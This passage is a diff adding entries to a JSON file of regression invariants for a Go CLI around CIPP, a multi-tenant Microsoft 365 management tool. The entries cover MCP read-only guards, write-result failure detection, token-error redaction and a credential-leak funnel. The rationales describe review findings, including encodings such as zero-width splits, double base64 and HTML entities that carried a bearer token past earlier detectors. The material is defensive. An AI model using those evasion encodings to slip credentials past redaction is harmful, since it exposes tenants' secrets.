+     "file": "cli/internal/cli/fresh_1b_r2_review_test.go",
+     "contains": "func TestFanoutNullBodyKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "rows, found = v.([]any)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fanout-read-only-guard",
+   "status": "active",
+   "summary": "fanout accepts only List*/Get* read endpoints, so it can never drive an action endpoint across every tenant.",
+   "why": "fanout is an MCP tool. Before the guard an MCP call could fan /ExecSendOrgMessage or /RemoveStandard across every tenant with no confirmation step.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "func checkFanoutEndpoint(e string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "if err := checkFanoutEndpoint(e); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reprint_novels_test.go",
+     "contains": "func TestFanoutRefusesActionEndpoints(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bulk-not-an-mcp-tool",
+   "status": "active",
+   "summary": "bulk (CSV-driven writes) is hidden from the MCP server and its --from file flag is never an MCP argument.",
+   "why": "bulk reads a host file and executes writes across tenants. Press 4.34.0's blocked MCP input set does not include \"from\", which the retired mcp-filesystem-destination-gate used to cover.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "\"mcp:hidden\": \"true\", \"mcp:read-flags\": \"from\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reprint_novels_test.go",
+     "contains": "func TestBulkIsNotAnMCPTool(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "tenant-scoped-store-keys",
+   "status": "active",
+   "summary": "Rows fanout saves are keyed on (id, tenant), so two tenants sharing an id (license SKUs) no longer overwrite each other.",
+   "why": "CIPP returns the same id in many tenants (SKU ids, policy template ids); keying the store on id alone kept only the last tenant's row.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/tenant_scope.go",
+     "contains": "func TenantScopeResource(resourceType string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "store.TenantScopeResource(resourceTypeForEndpoint(e))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fanout-save-honors-no-local-data",
+   "status": "active",
+   "summary": "With CIPP_NO_LOCAL_DATA=1, fanout --save and --resume refuse before anything is written; a live fanout without them still runs.",
+   "why": "Press 4.34.0's no-local-data switch blocks the generated sync and workflow archive commands, but cipp fills its store with the hand-written fanout --save, which the switch did not reach: an operator who chose no local copy still got every tenant's rows on disk.",
+   "spec_encode_followup": "Press-side: let a novel command declare itself a local-data writer so applyLocalDataEnv refuses it with the generated ones.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "if flagSave && localDataDisabled() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout_nolocaldata_test.go",
+     "contains": "func TestFanoutSaveRefusedWithNoLocalData(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "if flagResume && localDataDisabled() {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "posture-mfa-reads-listmfausers",
+   "status": "active",
+   "summary": "posture --dimension mfa reads the rows fanout saved from /ListMFAUsers, which carry the MFA registration fields.",
+   "why": "Earlier builds read /ListUsers, which carries no MFA fields, so every user could count as missing MFA. Reported by CIPP's author on 2026-10-22.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/posture.go",
+     "contains": "\"mfa\":       {resourceType: \"mfausers\", listEndpoint: \"/ListMFAUsers\"},",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-execute-cipp-results-failure",
+   "status": "active",
+   "summary": "cipp_execute returns an error result when a state-changing call comes back HTTP 200 with a failure inside CIPP's Results.",
+   "why": "CIPP answers several writes (EditUser, ExecOffboardUser, AddScheduledItem) with HTTP 200 and the failure as text in Results. The generated executor returned it as a successful tool result, so an agent reported a failed offboard as done (Codex round 1 on the publish branch).",
+   "spec_encode_followup": "Press-side: let a connector register a response-body failure detector the executor applies to write results.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "if msg := cli.CippResultsFailure(data); msg != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func CippResultsFailure(data []byte) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/execute_results_failure_test.go",
+     "contains": "func TestExecuteReportsCippResultsFailure(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-tail-read-endpoints-only",
+   "status": "active",
+   "summary": "export and tail refuse a resource whose path is not a CIPP read (List*/Get*), so neither can GET a state-changing action endpoint.",
+   "why": "CIPP names 43 state-changing endpoints as GET actions (ExecExtensionClearHIBPKey, ExecRunBackup, RemoveStandard). The generated export command is an MCP tool and accepted them as resources, so an MCP call ran one with no preview or confirm (Codex round 1 on the publish branch); tail would poll one repeatedly.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "if err := checkCippReadPath(path); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/tail.go",
+     "contains": "err = checkCippReadPath(path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "func checkCippReadPath(path string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestExportRefusesActionEndpoints(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "tenant-list-message-is-not-a-fleet",
+   "status": "active",
+   "summary": "The tenant list, the GDAP relationship list and every fanout response go through ONE document walker (cippScan, shared with write results). It walks the whole response, envelope and every element at any depth, and any failure signal anywhere refuses the whole response: failure wording (word boundary) in a string under a status-like key (lowercased name contains state, status, result, message, msg, text, detail, reason or fail) or in a bare message string, a populated key whose lowercased name contains error, exception or fault, a key named like success, succeeded or ok (ok as a whole word: isOk, OK, not outlook or token) holding false or \"false\", and a state/status-like key holding a failure state. Stored rows stay. Status-like ancestry: any value at any depth under a status-like key is checked ({\"status\":{\"code\":\"error\"}}), except the document's own row container (a top-level array, or the Results/data/value/items array of a top-level envelope). Every body is decoded strictly: a duplicate object key at any depth (compared case-insensitively) refuses the list. The one exemption applies only when validating the tenant LIST, never to write results or any other response: each tenant row's own LastGraphError, LastGraphTokenError and GraphErrorCount (that tenant's Graph token state). The tenant and GDAP lists also require every element to be an object carrying the identity key (defaultDomainName, id). A row whose own name or description holds a failure word (a user named \"Error Reporting\", a group named \"Denied Access\") is still a row. Write results still read failure wording in any string (cipp-results-failure-vocabulary). Trade-off (documented): a list whose rows report their own failed status is refused; run fanout with --json to see what CIPP returned.",
+   "why": "CIPP appends a failure string to a partial list. tenantEnvelopeArray kept the objects and dropped the string, so fanout --all-tenants ran on part of the fleet and saved it as the tenant list, and gdap expiring could report covered tenants as uncovered (Codex round 1 on the publish branch). Codex round 3: a structured failure entry ({\"state\":\"error\",\"resultText\":\"Failed to retrieve remaining tenants\"}) passed as a row and was then dropped for having no domain, so fanout ran on part of the fleet. Fresh Codex round 1: a failure object carrying an id passed as a row (fanout --save deleted p2), and an envelope-level error beside a partial Results list was discarded (the stored tenant list lost b.example). Fresh Codex round 2: the field list omitted status, text, msg, detail and details, so {\"id\":\"error-1\",\"status\":\"error\"} passed and an envelope \"status\":\"error\" was ignored. Fresh Codex round 3: an element {\"id\":\"error-1\",\"error\":\"HTTP 403\"} and an envelope \"error\":\"HTTP 403\" passed because \"HTTP 403\" carries no failure word; the populated error field is now the signal. CIPP's own tenant records carry LastGraphError (Get-Tenants.ps1, Get-GraphToken.ps1), so without the tenant-record exemption one tenant with a failed Graph token would refuse the whole fleet. Batch 1b Codex round 1: each check looked at part of the response, so an element {\"id\":\"partial\",\"success\":false} passed and fanout --save deleted u2. Orchestrator decision after batch 1b round 1: failure wording anywhere refused healthy lists (a user named \"Error Reporting\"), and none of Codex's inputs needed it; lists read wording only under status-like keys, every structural signal stays. Batch 1b Codex round 2: the tenant-record exemption also hid a write failure in a tenant-shaped write answer; a failure nested under \"status\" beside a partial list was ignored; a duplicate key let the last value win.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "func cippListRows(data json.RawMessage, what string, rowExcept map[string]bool, idKeys ...string) ([]map[string]any, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "return nil, fmt.Errorf(\"CIPP returned a message with the %s, so it would be incomplete: %s\", what, strings.Join(bad, \"; \"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/gdap_expiring.go",
+     "contains": "return cippListRows(data, \"GDAP relationship list\", nil, \"id\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestTenantListWithMessageIsRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestGDAPListWithMessageIsRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "case tenantFieldLookup(m, idKeys...) == \"\":",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round3_review_test.go",
+     "contains": "func TestTenantListWithFailureObjectIsRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r1_review_test.go",
+     "contains": "func TestFanoutFailureObjectWithIDKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r1_review_test.go",
+     "contains": "func TestTenantEnvelopeFailureKeepsStoredTenants(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r1_review_test.go",
+     "contains": "func TestFanoutEnvelopeFailureKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r2_review_test.go",
+     "contains": "func TestFanoutStatusErrorElementKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r2_review_test.go",
+     "contains": "func TestTenantEnvelopeStatusErrorKeepsStoredTenants(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "var tenantRecordFields = map[string]bool{\"lastgrapherror\": true, \"lastgraphtokenerror\": true, \"grapherrorcount\": true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestFanoutErrorFieldElementKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestFanoutEnvelopeErrorFieldKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestTenantEnvelopeErrorFieldKeepsStoredTenants(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestTenantGraphErrorFieldsAreTenantData(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "if failure := cippResponseFailure(v, rowExcept); failure != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "if failure := cippResponseFailure(doc, nil); failure != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippResponseFailure(doc any, rowExcept map[string]bool) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutSuccessFalseElementKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestWalkerKeepsTenantRecordsAndOutlookKeys(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "if cippFailureWords.MatchString(x) && (!sig.list || inStatus || key == \"\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "var cippListWordKeyParts = []string{\"state\", \"status\", \"result\", \"message\", \"msg\", \"text\", \"detail\", \"reason\", \"fail\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "sig := cippSignals{list: true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reprint_review_test.go",
+     "contains": "func TestFanoutFailureMessageKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutNamesWithFailureWordsAreRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutStatusFailedElementKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutStatusKeyWordingKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "if rowExcept[strings.ToLower(k)] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "cippScanValue(child, k, sig, inStatus || cippListWordKey(k))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "v, err := cippDecodeStrict(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_r2_review_test.go",
+     "contains": "func TestFanoutNestedStatusFailureKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_r2_review_test.go",
+     "contains": "func TestFanoutDuplicateKeyKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-error-text-allowlist",
+   "status": "active",
+   "summary": "A failed token request prints no vendor prose: only an OAuth error code from a fixed enum (RFC 6749 plus Azure AD's interaction_required, temporarily_unavailable, server_error) and the AADSTS error numbers found in error_description; everything else is withheld. Every error built from a token-endpoint answer, 2xx or not, including JSON decode and type errors, is described by kind only (\"token response could not be decoded\", \"token response contained no access_token\") plus that allowlisted code and the AADSTS numbers when the body is an Azure AD error (TokenResponseError); never body text and never a Go decoder message, which quotes the input. Both auth login and the client re-mint.",
+   "why": "Codex rounds 1 and 2 on the publish branch each found a new encoding of a token member that a decode-and-match redaction missed (escaped member names, then a malformed percent sign shielding valid escapes). An allowlist of what may be shown cannot be outrun by a new encoding. Applies to auth login and the client re-mint. Codex round 3: a prose allowlist still printed a token echoed in plain words next to an AADSTS code; the class fix prints no prose at all. Batch 1b Codex round 1: an HTTP 200 whose expires_in overflowed int put the token, quoted by the JSON decoder, into the printed error.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "func TokenErrorText(body []byte) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.maskCredentialTextLocked(TokenErrorText(body), clientSecret))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "cliutil.FunnelWithhold(maskSecret(client.TokenErrorText(body), clientSecret), []string{clientSecret}))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact_escape_test.go",
+     "contains": "func TestTokenErrorTextShowsOnlyPlainProse(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "if tokenErrorCodes[aad.Error] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "var aadstsCode = regexp.MustCompile(`\\bAADSTS[0-9]{4,7}\\b`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round3_review_test.go",
+     "contains": "func TestAuthLoginPrintsNoTokenEndpointProse(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "func TokenResponseError(kind string, body []byte) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "client.TokenResponseError(\"token response could not be decoded\", body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "TokenResponseError(\"token response could not be decoded\", body))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestLoginTokenDecodeErrorQuotesNothing(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_1b_test.go",
+     "contains": "func TestMintTokenDecodeErrorQuotesNothing(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "cipp-results-failure-vocabulary",
+   "status": "active",
+   "summary": "A CIPP write result is tri-state, decided by the one document walker (cippScan, shared with list validation) over the WHOLE response document, the envelope beside Results as much as Results itself: failure wording in any string value (word boundary, plus camelCase failure codes), a populated key whose lowercased name contains error, exception or fault (non-empty string, non-zero number, object or non-empty array), a key named like success, succeeded or ok holding false or \"false\", and a state/status-like key holding a failure state. Any failure signal plus any success signal anywhere = conflicting (an error, never resent); failure alone = failure; success only when no failure signal exists anywhere. No exemption applies to a write result: a tenant-shaped answer's LastGraphError is a failure. The body is decoded strictly (cippDecodeStrict): a duplicate object key at any depth, compared case-insensitively, makes the write a failure, because a decoder keeps only one of the two values.",
+   "why": "Codex round 2 on the publish branch: {\"Results\":[\"Access denied\"]} after a confirmed cipp_execute write came back as a success. For a write a false failure is the safe side: the text is still shown. Adversarial round 2: CIPP's structured success for a password reset ('... will fail if writeback is not enabled ... cannot be turned off', state success) was reported as a failure, and bulk --resume then sent the reset again. Codex round 3: an empty resultText ended the scan and hid \"Failed to disable sign-in\" in message. Fresh Codex round 1: an explicit success state hid 'The operation failed: access denied'; the write came back as a success and bulk checkpointed it. Fresh Codex round 2: a line opening 'Successfully' hid 'failed to disable sign-in' later in the same text. Fresh Codex round 3: {\"state\":\"success\",\"error\":\"HTTP 403\"} came back as a success and bulk checkpointed it, because \"HTTP 403\" carries no failure word. Batch 1b Codex round 1: {\"Results\":[\"success\"],\"error\":\"HTTP 403\"} came back as a success because only Results was read; bulk checkpointed it. Batch 1b Codex round 2: {\"defaultDomainName\":...,\"Results\":[\"success\"],\"LastGraphError\":\"Failed ...\"} and {\"Results\":[\"Failed ...\"],\"Results\":[\"success\"]} came back as successes.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestCippResultsFailureTrustsState(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round3_review_test.go",
+     "contains": "func TestCippResultsEveryFieldIsRead(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_r1_test.go",
+     "contains": "func TestExecuteSuccessStateWithFailureTextIsAnError(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippScan(v any, key string, sig *cippSignals) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "\tcase s.fail && s.success:\n\t\treturn cippConflicting",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "cippScan(e, \"Results\", &sig)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_r2_test.go",
+     "contains": "func TestExecuteSuccessLeadStillConflicts(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "if cippErrorKey(k) && cippPopulated(child) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_r3_test.go",
+     "contains": "func TestExecuteSuccessStateWithErrorFieldFails(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_r3_review_test.go",
+     "contains": "func TestBulkSuccessStateWithErrorFieldIsHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippOKKey(key string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippDocument(data []byte) (doc any, ok bool, err error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "\tdoc, ok, err := cippDocument(data)\n\tif err != nil {\n\t\treturn cippFailure, fmt.Sprintf(\"CIPP returned HTTP 2xx with a response that cannot be read safely: %v\", err), nil\n\t}\n\tif !ok {\n\t\treturn cippSuccess, \"\", nil\n\t}\n\tvar sig cippSignals\n\tcippScanDoc(doc, &sig, nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_1b_test.go",
+     "contains": "func TestExecuteEnvelopeErrorBesideSuccessFails(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestBulkEnvelopeErrorBesideSuccessIsHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippDecodeStrict(data []byte) (any, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "return nil, fmt.Errorf(\"%w %q\", errCippDuplicateKey, k)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func cippScanDoc(doc any, sig *cippSignals, rowExcept map[string]bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_1b_r2_test.go",
+     "contains": "func TestExecuteTenantShapedFailureIsAnError(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_1b_r2_test.go",
+     "contains": "func TestExecuteDuplicateResultsKeyIsAnError(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bulk-checkpoint-per-file",
+   "status": "active",
+   "summary": "A bulk --resume checkpoint is keyed by the sha256 of the CSV's bytes and its resolved path, so any edit to the file (whatever its size or modification time) starts a fresh checkpoint.",
+   "why": "The checkpoint was named from the CSV's basename only. Next week's offboards.csv, in any folder, had its first N rows treated as done: bulk sent nothing, printed 0 rows executed and exited 0 (adversarial round 3). Codex round 3: an edit that kept the file's length and modification time reused the checkpoint and skipped the new row.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "rows, err := parseBulkCSV(io.TeeReader(f, csvHash))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestBulkCheckpointPerFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "_, _ = h.Write(contentSum)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round3_review_test.go",
+     "contains": "func TestBulkResumeEditedCSVSameSizeAndTime(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "success-body-credential-funnel",
+   "status": "active",
+   "summary": "Every successful response body passes the configured-credential funnel. First every character the detector treats as removable (control and Unicode format characters such as U+200B, U+200C, U+200D, U+2060 and U+FEFF, and invalid UTF-8) is stripped from each decoded JSON string and key (or from the text of a non-JSON body). A body up to 1 MiB after normalizing (the most the shared detector scans whole) goes through that detector (exact, escaped, decoded, hex and the rest) over the WHOLE normalized body and the original bytes, with no windowing; if anything is detected, strings, numbers and keys are redacted, serialized and re-checked whole, and any residue withholds the body with a fixed error. A larger body, up to the response size limit (CIPP_MAX_RESPONSE_BYTES), gets a full-length linear scan, with no windowing: the body text and every decoded JSON token (duplicate keys included), with removable characters dropped, as written, with %XX, \\xXX and \\uXXXX escapes decoded, and with HTML entities decoded, all lowercased, searched for every mask credentialMaskSet builds for each configured credential (exact, URL-escaped, JSON \\u-escaped, hex, base64, base32, UTF-16 and the rest) plus standard and URL-safe base64 at all three byte alignments. A hit withholds the whole body with the same fixed error; a body over the response size limit is withheld; otherwise the body comes back byte for byte. Nothing withheld is returned, cached or stored. Then, for every body, whatever would be returned (as it came, or redacted) gets the per-value pass (valuesReveal): every JSON string, key and number, or the whole text of a non-JSON body, has ALL whitespace and every removable character removed FIRST, then the size rule: within recursiveDecodeCap (65536 bytes, where the client's own decoder stops) the full recursive decoding (maskCredentialText: the client decoder and the shared funnel), and any hit withholds the body; over it the body is withheld as too large to check (ErrSuccessBodyValueTooLarge). There is no partial scan, run-splitting or fallback detector for an oversized value. A single value over 64 KiB once spaces are removed, or a non-JSON body over 64 KiB, therefore withholds the response; bodies of any size made of values within the cap pass after full decoding.",
+   "why": "Fresh Codex round 1: only error bodies were funnelled, so a tenant display name repeating the configured bearer reached MCP stdout and the response cache. The shared MCP backstop deliberately skips success results, so the fix sits in this connector's client. Fresh Codex round 2: a JSON number carrying the bearer's hex encoding survived the per-string pass. Fresh Codex round 3: a bearer split by 200000 U+200B characters spanned the 512 KiB detection windows, so the body was returned and cached with the bearer recoverable. Large-body follow-up (ratified in-connector, shared funnel unchanged): withholding every body over 1 MiB refused large tenants' /ListUsers and fanout; the linear scan keeps them while still finding the credential in every encoding, split by zero-width characters, past the 1 MiB mark. Batch 1b Codex round 1: a body past 1 MiB carrying the key base64-encoded twice passed the single-pass linear scan and reached MCP output and the cache. Batch 1b Codex round 2: a text/plain body past 1 MiB carrying the key base64-encoded twice skipped recursive decoding. Final Codex session round 1: one JSON string holding the key base64-encoded twice, cut by spaces and padded with 70000 spaces, passed: spaces kept every base64 run below the shared detector's minimum length, and the client's decoder stops past 64 KiB. Final Codex session round 2: HTML entities split the encoding runs of an oversized value and the full-length scan decoded only the outer layer, so a key written as entities over base64 over base64, padded past the cap, passed. The partial path was removed.",
+   "spec_encode_followup": "Press-side: run success bodies through maskCredentialText in the generated client, not only error bodies.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/fresh_r1_test.go",
+     "contains": "func TestReadSuccessBodyWithholdsConfiguredBearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "func (c *Client) redactSuccessBody(body []byte, extraCredentials ...string) ([]byte, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "\tif len(out) > successFunnelMaxScan || c.credentialDetected(out, extraCredentials) {\n\t\treturn nil, ErrSuccessBodyWithheld\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "redacted, rerr := c.redactSuccessBody(sanitizeJSONResponse(respBody), authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "redacted, rerr := c.redactSuccessBody(env, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/fresh_r2_test.go",
+     "contains": "func TestReadSuccessBodyNumberEncodedBearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "\tif len(normalized) > successFunnelMaxScan {\n\t\tif int64(len(body)) > maxResponseBytes() {\n\t\t\treturn nil, ErrSuccessBodyTooLarge\n\t\t}\n\t\tif c.largeBodyRevealsCredential(body, isJSON, extraCredentials) {\n\t\t\treturn nil, ErrSuccessBodyWithheld\n\t\t}\n\t\treturn body, nil\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel.go",
+     "contains": "v = normalizeJSONValue(v, &changed)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_r3_test.go",
+     "contains": "func TestSuccessFunnelZeroWidthSplitBearer(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/fresh_r3_test.go",
+     "contains": "func TestSuccessFunnelScanLimitAndCleanBytes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
